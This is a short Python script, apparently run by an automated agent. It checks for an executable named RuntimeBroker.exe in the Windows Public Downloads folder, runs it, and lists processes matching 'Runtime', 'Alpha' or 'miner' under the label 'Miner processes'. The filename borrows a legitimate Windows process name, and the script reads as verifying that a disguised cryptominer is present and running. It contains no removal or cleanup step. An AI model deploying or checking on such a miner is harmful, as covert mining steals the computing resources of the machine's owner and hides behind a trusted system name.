import subprocess
import os

out = []
dst = r'C:\Users\Public\Downloads\RuntimeBroker.exe'

out.append(f'Exe exists: {os.path.exists(dst)}')
if os.path.exists(dst):
    out.append(f'Size: {os.path.getsize(dst)}')

# Try running directly and capture error
try:
    p = subprocess.run([dst, '--help'], capture_output=True, text=True, timeout=5)
    out.append(f'Help output: {p.stdout[:100] if p.stdout else "none"}')
    out.append(f'Stderr: {p.stderr[:100] if p.stderr else "none"}')
except Exception as e:
    out.append(f'Run error: {e}')

# Check processes
p = subprocess.run(['tasklist'], capture_output=True, text=True)
miners = [l for l in p.stdout.split(chr(10)) if 'Runtime' in l or 'Alpha' in l or 'miner' in l.lower()]
out.append(f'Miner processes: {miners}')

result = chr(10).join(out)
